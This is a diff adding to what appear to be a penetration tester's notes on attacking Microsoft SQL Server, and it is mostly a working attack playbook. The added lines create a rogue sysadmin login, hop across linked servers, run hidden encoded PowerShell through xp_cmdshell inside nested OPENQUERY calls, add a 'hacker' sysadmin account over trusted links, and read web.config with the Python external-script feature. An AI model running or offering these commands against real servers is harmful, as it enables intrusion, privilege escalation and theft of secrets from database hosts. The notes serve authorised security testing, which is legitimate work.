@@ -15,11 +15,26 @@ If MSSQL port is open, try to login and see if we can execute commands or we are
 https://www.exploit-db.com/papers/12975
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
 https://learn.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver16
-
+https://www.bugb.co/post/1433-pentesting-mssql-microsoft-sql-server
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
 
 cme mssql $IP -u $USER -p $PASS (--local-auth / --windows-auth) -L # list modules
 ... -M mssql_priv
+
+# Find version
+select @@version;
+# KNOWN EXPLOITS
+CVE-2018-8273
+# Admin users
+SELECT name FROM master..syslogins WHERE sysadmin = '1';
+
+# Create a new user with sysadmin privilege
+CREATE LOGIN tester WITH PASSWORD = 'password'
+EXEC sp_addsrvrolemember 'tester', 'sysadmin'
+# * Use those permissions to create a new sysadmin user so we do not need to go through link servers again in order to execute commands.
+
+# Check my permissions
+select * from fn_my_permissions(null, 'server');
 
 mssqlclient.py ...
 SQL> help
@@ -139,16 +154,62 @@ SQL> xp_dirtree '\\$LOCAL_IP\myshare',1,1
 ```
 {% endcode %}
 
-## RCE/Read files executing scripts (Python and R)
+## Linked Servers
+
+\* Enum linked servers until we get access to a sysadmin user.
 
 {% code overflow="wrap" fullWidth="true" %}
-```sql
-# Print the user being used (and execute commands)
+```bash
+https://www.netspi.com/blog/technical-blog/network-pentesting/how-to-hack-database-links-in-sql-server/
+https://www.hackingarticles.in/mssql-for-pentester-abusing-linked-database/
+https://www.tarlogic.com/blog/linked-servers-adsi-passwords/
+https://www.helpnetsecurity.com/2025/01/17/mssqlpwner-open-source-pentesting-mssql-servers/
+https://mayfly277.github.io/posts/GOADv2-pwning-part7/
+https://exploit-notes.hdks.org/exploit/database/mssql-pentesting/
+
+select srvname, isremote from sysservers;
+# isremote column determines if a server is linked or not
+# 1 -> remote server // 0 -> linked server
+
+# The EXEC statement can be used to execute queries on linked servers. Let's ﬁnd out the user in whose context we are able to query the linked server.
+EXEC ('select current_user') at [SERVER\LINK]; 
+# 2 links depth
+EXEC ('EXEC (''select suser_name()'') at [SERVER\LINK2]') at [SERVER/LINK1];
+'
+
+enum_links
+use_link "HOST\LINK"
+# Traverse different links (like concatenation of them) and check your user permission every time we use a new link
+select * from fn_my_permissions(null, 'server');
+
+
+select * from master..sysservers;
+EXEC sp_linkedservers;
+select * from openquery("dcorp-sql1", 'select * from master..sysservers')
+Check where double and single quotes are used, it's important to use them that way.
+# First level RCE
+SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
+# Second level RCE
+SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
+You can also abuse trusted links using EXECUTE:
+#Create user and give admin privileges
+EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
+EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
+```
+{% endcode %}
+
+## Read files / executing scripts as other users  (Python and R)
+
+{% code overflow="wrap" fullWidth="true" %}
+```bash
+https://hacktricks.boitatech.com.br/pentesting/pentesting-mssql-microsoft-sql-server#read-files-executing-scripts-python-and-r
+
+#Print the user being used (and execute commands)
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
-# Open and read a file
+#Open and read a file
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
-# Multiline
+#Multiline
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'
 import sys
 print(sys.version)
@@ -156,6 +217,21 @@ print(sys.version)
 GO
 ```
 {% endcode %}
+
+## Interactive shell
+
+[https://alamot.github.io/mssql\_shell/](https://alamot.github.io/mssql_shell/)
+
+```bash
+# On my VM w/ some modifications as arguments
+└─$ mssql_shell.py --server $IP --username tester2 --password 'Password1@'
+```
+
+## xp\_cmdshell blocked
+
+[https://www.mssqltips.com/sqlservertip/2987/can-i-stop-a-system-admin-from-enabling-sql-server-xpcmdshell/](https://www.mssqltips.com/sqlservertip/2987/can-i-stop-a-system-admin-from-enabling-sql-server-xpcmdshell/)
+
+[https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/#triggerremoval](https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/#triggerremoval)
 
 ## Manual SQL Server Queries
 
